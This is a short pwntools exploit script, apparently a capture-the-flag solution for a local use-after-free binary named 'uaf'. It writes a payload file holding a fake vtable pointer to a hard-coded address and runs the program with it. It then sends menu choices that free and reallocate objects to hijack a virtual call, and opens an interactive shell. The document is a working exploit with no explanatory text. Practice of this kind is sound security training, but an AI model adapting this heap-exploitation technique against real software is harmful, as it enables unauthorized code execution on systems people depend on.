from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

bin = ELF('./uaf')

fd = open('something','wb')
fd.write(p64(0x0000000000401570-8) + 'a'*(24-8))
fd.close()

cn = process(executable='./uaf',argv=['uaf','24','something'])

cn.recv()
cn.sendline('3')
cn.recv()
cn.sendline('2')
cn.recv()
cn.sendline('2')
cn.recv()
cn.sendline('1')
cn.interactive()